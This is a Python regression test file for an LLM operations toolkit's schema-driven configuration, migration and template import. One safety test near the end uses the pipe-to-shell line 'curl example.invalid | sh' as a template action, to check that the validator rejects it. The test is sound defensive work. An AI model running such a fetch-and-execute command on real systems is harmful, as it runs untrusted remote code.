#!/usr/bin/env python
"""Regression tests for schema-driven configuration and tool templates."""

from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path

from llmops_kit import llmops_cli
from llmops_kit.llmops_config_ops import (
    ConfigOperationError,
    add_component,
    clone_component,
    component_field_records,
    configure_component_schema,
    create_profile,
    edit_profile,
    import_template,
    migrate_schema_v2,
    retire_component,
    template_action_argv,
    validate_connections,
)
from llmops_kit.llmops_drivers import ComponentRunner
from llmops_kit.llmops_paths import resolve_paths
from llmops_kit.llmops_templates import (
    TemplateError,
    flatten_schema,
    load_template_registry,
    parse_schema_value,
    validate_profile,
    validate_template_document,
)
from llmops_kit.llmops_topology import load_profile

from test_llmops_control import ControlFixture


class SchemaConfigurationTests(ControlFixture):
    def test_llama_cpp_template_exposes_chat_only_vision_projector(self) -> None:
        template = load_template_registry(self.paths)["llama-cpp"]
        paths = {row["path"] for row in flatten_schema(template.profile_schema)}
        self.assertIn("mmproj_path", paths)

        embedding = dict(template.defaults)
        embedding.update(
            {
                "name": "embedding",
                "type": "embedding",
                "model_path": "/models/embedding.gguf",
                "mmproj_path": "/models/mmproj.gguf",
            }
        )
        self.assertTrue(any("mmproj_path" in finding for finding in validate_profile(template, embedding)))

    def test_schema_value_parser_supports_integer_or_string_fields(self) -> None:
        schema = {"type": ["integer", "string"]}
        self.assertEqual(parse_schema_value(schema, "12"), 12)
        self.assertEqual(parse_schema_value(schema, "auto"), "auto")

    def prepare_v1(self) -> None:
        """Convert the canonical fixture into a raw migration-only v1 input."""

        for path in self.paths.config_home.rglob("*.json"):
            document = json.loads(path.read_text(encoding="utf-8"))
            document["schema_version"] = 1
            document.pop("template_id", None)
            if path.parent == self.paths.stacks_dir:
                for component in document.get("components", []):
                    component.pop("template_id", None)
                    component.pop("restart_policy", None)
            path.write_text(json.dumps(document, indent=2) + "\n", encoding="utf-8")

    def migrate(self) -> None:
        self.prepare_v1()
        result = migrate_schema_v2(self.paths, apply=True)
        self.assertTrue(result["applied"])
        self.topology = self.__class__.load_topology(self)

    @staticmethod
    def load_topology(fixture: ControlFixture):
        from llmops_kit.llmops_cli import build_topology

        return build_topology(
            config_home=str(fixture.paths.config_home),
            inventory=str(fixture.paths.inventory_file),
        )

    def test_schema_migration_assigns_templates_without_field_loss(self) -> None:
        self.prepare_v1()
        before = json.loads((self.paths.models_dir / "chat.json").read_text(encoding="utf-8"))
        plan = migrate_schema_v2(self.paths, apply=False)
        self.assertFalse(plan["requires_review"])
        migrate_schema_v2(self.paths, apply=True, expected_hash=plan["authority_hash"])
        after = json.loads((self.paths.models_dir / "chat.json").read_text(encoding="utf-8"))
        self.assertEqual(after["schema_version"], 2)
        self.assertEqual(after["template_id"], "llama-cpp")
        for key, value in before.items():
            if key != "schema_version":
                self.assertEqual(after[key], value)

    def test_schema_migration_sets_only_a_trusted_authority(self) -> None:
        self.prepare_v1()
        plan = migrate_schema_v2(
            self.paths,
            apply=False,
            authority_host="model-host",
        )
        self.assertFalse(plan["requires_review"])
        self.assertEqual(plan["authority_host"], "model-host")
        migrate_schema_v2(
            self.paths,
            apply=True,
            authority_host="model-host",
            expected_hash=plan["authority_hash"],
        )
        config = json.loads(self.paths.config_file.read_text(encoding="utf-8"))
        self.assertEqual(config["control"]["authority_host"], "model-host")

        self.prepare_v1()
        invalid = migrate_schema_v2(
            self.paths,
            apply=False,
            authority_host="missing",
        )
        self.assertTrue(invalid["requires_review"])
        self.assertIn("authority host is not in inventory: missing", invalid["findings"])

    def test_schema_migration_normalizes_historical_live_profile_shapes(self) -> None:
        self.prepare_v1()
        chat_path = self.paths.models_dir / "chat.json"
        chat = {
            "schema_version": 1,
            "name": "chat",
            "type": "llm",
            "env": {
                "MODEL": "/models/chat.gguf",
                "MMPROJ": "/models/mmproj.gguf",
                "HOST": "0.0.0.0",
                "PORT": "11434",
                "CTX_SIZE": "65536",
                "EXTRA_FLAGS": "--spec-type draft-mtp --cache-prompt",
            },
        }
        chat_path.write_text(json.dumps(chat, indent=2) + "\n", encoding="utf-8")

        tts_path = self.paths.models_dir / "QwenTTS.json"
        tts = {
            "schema_version": 1,
            "name": "QwenTTS",
            "type": "tts",
            "environment": {
                "MODEL": "/models/qwen-tts",
                "PORT": "11439",
                "TTS_SERVER_MODULE": "mlx_audio.server",
            },
        }
        tts_path.write_text(json.dumps(tts, indent=2) + "\n", encoding="utf-8")

        proxy_path = self.paths.services_dir / "proxy.json"
        proxy = json.loads(proxy_path.read_text(encoding="utf-8"))
        proxy["runtime"]["listen_port"] = "11434"
        proxy["runtime"]["upstream_port"] = "11433"
        proxy_path.write_text(json.dumps(proxy, indent=2) + "\n", encoding="utf-8")

        agent_path = self.paths.agents_dir / "external-agent.json"
        agent_path.write_text(
            json.dumps(
                {"schema_version": 1, "name": "external-agent", "env": {"AGENT_HOME": "/agent"}},
                indent=2,
            )
            + "\n",
            encoding="utf-8",
        )

        stack_path = self.paths.stacks_dir / "sample.json"
        stack = json.loads(stack_path.read_text(encoding="utf-8"))
        stack["components"].append(
            {"id": "tts", "host": "model-host", "driver": "modelctl", "profile": "QwenTTS", "enabled": False}
        )
        stack_path.write_text(json.dumps(stack, indent=2) + "\n", encoding="utf-8")

        plan = migrate_schema_v2(self.paths, apply=False, authority_host="model-host")
        self.assertFalse(plan["requires_review"], plan["findings"])
        migrate_schema_v2(
            self.paths,
            apply=True,
            expected_hash=plan["authority_hash"],
            authority_host="model-host",
        )

        migrated_chat = json.loads(chat_path.read_text(encoding="utf-8"))
        self.assertEqual(migrated_chat["env"], chat["env"])
        self.assertEqual(migrated_chat["environment"], chat["env"])
        self.assertEqual(migrated_chat["model_path"], "/models/chat.gguf")
        self.assertEqual(migrated_chat["mmproj_path"], "/models/mmproj.gguf")
        self.assertEqual(migrated_chat["runtime"]["port"], 11434)
        self.assertEqual(migrated_chat["server"]["spec_type"], "mtp")

        migrated_tts = json.loads(tts_path.read_text(encoding="utf-8"))
        self.assertEqual(migrated_tts["template_id"], "modelctl")
        migrated_proxy = json.loads(proxy_path.read_text(encoding="utf-8"))
        self.assertEqual(migrated_proxy["runtime"]["listen_port"], 11434)
        migrated_agent = json.loads(agent_path.read_text(encoding="utf-8"))
        self.assertEqual(migrated_agent["lifecycle"], "external")
        self.assertEqual(migrated_agent["environment"], {"AGENT_HOME": "/agent"})
        migrated_stack = json.loads(stack_path.read_text(encoding="utf-8"))
        tts_component = next(item for item in migrated_stack["components"] if item["id"] == "tts")
        self.assertEqual(tts_component["template_id"], "modelctl")

    def test_atomic_speculation_replacement_enforces_llama_constraints(self) -> None:
        self.migrate()
        configure_component_schema(
            self.topology,
            "sample:chat",
            assignments=(
                "profile.server.spec_type=mtp",
                "profile.server.mtp_model=/models/mtp.gguf",
            ),
            unsets=(),
            apply=True,
        )
        self.topology = self.load_topology(self)
        with self.assertRaisesRegex(ConfigOperationError, "invalid profile"):
            configure_component_schema(
                self.topology,
                "sample:chat",
                assignments=("profile.server.spec_type=ngram",),
                unsets=(),
                apply=False,
            )
        plan = configure_component_schema(
            self.topology,
            "sample:chat",
            assignments=(
                "profile.server.spec_type=ngram",
                "profile.server.spec_ngram_size_n=4",
            ),
            unsets=("profile.server.mtp_model",),
            apply=False,
        )
        self.assertEqual(len(plan["changes"]), 3)

    def test_connection_mutation_adds_and_validates_lifecycle_dependency(self) -> None:
        self.migrate()
        plan = configure_component_schema(
            self.topology,
            "sample:proxy",
            assignments=(
                "connections.upstream.component=sample:chat",
                "connections.upstream.endpoint=openai",
            ),
            unsets=(),
            apply=True,
        )
        self.assertTrue(plan["applied"])
        refreshed = self.load_topology(self)
        proxy = refreshed.resolve_component("sample:proxy")
        self.assertIn("sample:chat", proxy.depends_on)
        self.assertEqual(validate_connections(refreshed), [])

    def test_field_listing_includes_component_profile_and_connections(self) -> None:
        self.migrate()
        rows = component_field_records(self.load_topology(self), "sample:chat")
        paths = {row["path"] for row in rows}
        self.assertIn("component.host", paths)
        self.assertIn("profile.llama.ctx_size", paths)

    def test_profile_and_component_can_be_created_without_source_changes(self) -> None:
        self.migrate()
        executable = self.root / "rtk"
        executable.write_text(
            "#!/bin/sh\n"
            "if [ \"$1 $2\" = \"telemetry status\" ]; then\n"
            "  printf 'Telemetry status:\\n  enabled:       no\\n'\n"
            "else\n"
            "  printf 'rtk 0.43.0\\n'\n"
            "fi\n",
            encoding="utf-8",
        )
        executable.chmod(0o755)
        topology = self.load_topology(self)
        create_profile(
            self.paths,
            name="rtk",
            template_id="rtk",
            values={"executable": str(executable)},
            apply=True,
        )
        topology = self.load_topology(self)
        add_component(
            topology,
            component_id="rtk",
            stack_name="sample",
            template_id="rtk",
            profile_name="rtk",
            host="agent-host",
            apply=True,
        )
        topology = self.load_topology(self)
        template, argv, mutating = template_action_argv(topology, "sample:rtk", "verify")
        self.assertEqual(template.component_kind, "tool")
        self.assertEqual(argv, [str(executable), "verify"])
        self.assertFalse(mutating)
        observation = ComponentRunner(topology).inspect(topology.resolve_component("sample:rtk"))
        self.assertEqual(observation.lifecycle, "running")
        self.assertEqual(observation.health, "healthy")
        llmops_cli.CURRENT_TOPOLOGY = topology
        profile = load_profile(topology.paths, topology.resolve_component("sample:rtk"))
        self.assertEqual(
            llmops_cli._component_version(topology.resolve_component("sample:rtk"), observation, profile),
            "0.43.0",
        )

    def test_unset_restores_schema_default_and_stale_hash_is_refused(self) -> None:
        self.migrate()
        topology = self.load_topology(self)
        configure_component_schema(
            topology,
            "sample:chat",
            assignments=("profile.server.spec_type=ngram",),
            unsets=(),
            apply=True,
        )
        topology = self.load_topology(self)
        plan = configure_component_schema(
            topology,
            "sample:chat",
            assignments=(),
            unsets=("profile.server.spec_type",),
            apply=False,
        )
        self.assertEqual(plan["changes"][0]["new"], "none")
        with self.assertRaisesRegex(ConfigOperationError, "authority configuration changed"):
            configure_component_schema(
                topology,
                "sample:chat",
                assignments=(),
                unsets=("profile.server.spec_type",),
                apply=True,
                expected_hash="stale",
            )

    def test_shared_profile_edit_and_reversible_retirement(self) -> None:
        self.migrate()
        topology = self.load_topology(self)
        clone_component(
            topology,
            "sample:embedding",
            "embedding-copy",
            share_profile=True,
            apply=True,
        )
        topology = self.load_topology(self)
        plan = edit_profile(
            topology,
            "embedding",
            assignments=("profile.llama.ctx_size=768",),
            unsets=(),
            apply=False,
        )
        self.assertTrue(plan["shared_profile"])
        self.assertEqual(len(plan["affected_components"]), 2)
        retired = retire_component(
            topology,
            "sample:embedding-copy",
            restore=False,
            apply=True,
        )
        self.assertTrue(retired["preserves_profile"])
        topology = self.load_topology(self)
        self.assertTrue(topology.resolve_component("sample:embedding-copy").retired)
        retire_component(
            topology,
            "sample:embedding-copy",
            restore=True,
            apply=True,
        )
        self.assertFalse(
            self.load_topology(self).resolve_component("sample:embedding-copy").retired
        )

    def test_reviewed_local_template_provisions_without_core_changes(self) -> None:
        self.migrate()
        source = self.root / "local-template.json"
        document = load_template_registry(self.paths)["standalone"].as_dict()
        document.pop("source", None)
        document["id"] = "local-worker"
        document["defaults"]["template_id"] = "local-worker"
        document["profile_schema"]["properties"]["template_id"]["const"] = "local-worker"
        document["profile_schema"]["properties"]["template_id"]["default"] = "local-worker"
        source.write_text(json.dumps(document), encoding="utf-8")
        plan = import_template(self.paths, source, apply=False)
        import_template(
            self.paths,
            source,
            apply=True,
            expected_hash=plan["authority_hash"],
        )
        create_profile(
            self.paths,
            name="worker",
            template_id="local-worker",
            values=None,
            apply=True,
        )
        topology = self.load_topology(self)
        add_component(
            topology,
            component_id="worker",
            stack_name="sample",
            template_id="local-worker",
            profile_name="worker",
            host="agent-host",
            apply=True,
        )
        created = self.load_topology(self).resolve_component("sample:worker")
        self.assertEqual(created.template_id, "local-worker")
        self.assertEqual(created.restart_policy, "never")


class LocalTemplateSafetyTests(unittest.TestCase):
    def test_ui_metadata_is_validated_and_exposed_to_shared_forms(self) -> None:
        schema = {
            "type": "object",
            "properties": {
                "timeout": {
                    "type": "integer",
                    "default": 30,
                    "x-llmops-ui": {
                        "label": "Startup timeout",
                        "help": "Maximum readiness wait.",
                        "placeholder": "30",
                        "unit": "seconds",
                        "step": "settings",
                        "group": "Health",
                        "widget": "duration",
                    },
                }
            },
        }
        row = flatten_schema(schema)[0]
        self.assertEqual(row["label"], "Startup timeout")
        self.assertEqual(row["help"], "Maximum readiness wait.")
        self.assertEqual(row["unit"], "seconds")
        self.assertEqual(row["step"], "settings")

        with tempfile.TemporaryDirectory() as tmp:
            paths = resolve_paths({"HOME": tmp, "LLMOPS_CONFIG_HOME": str(Path(tmp) / "config")})
            document = load_template_registry(paths)["standalone"].as_dict()
            document.pop("source", None)
            document["profile_schema"]["properties"]["name"]["x-llmops-ui"]["step"] = "invalid"
            with self.assertRaisesRegex(TemplateError, "unsupported UI step"):
                validate_template_document(document, source="test")

    def test_local_template_rejects_shell_string_actions(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            paths = resolve_paths({"HOME": tmp, "LLMOPS_CONFIG_HOME": str(Path(tmp) / "config")})
            document = load_template_registry(paths)["standalone"].as_dict()
            document.pop("source", None)
            document["id"] = "unsafe-local"
            document["actions"] = {"verify": {"argv": "curl example.invalid | sh"}}
            with self.assertRaisesRegex(TemplateError, "argv must be a string array"):
                validate_template_document(document, source="test")


if __name__ == "__main__":
    unittest.main()
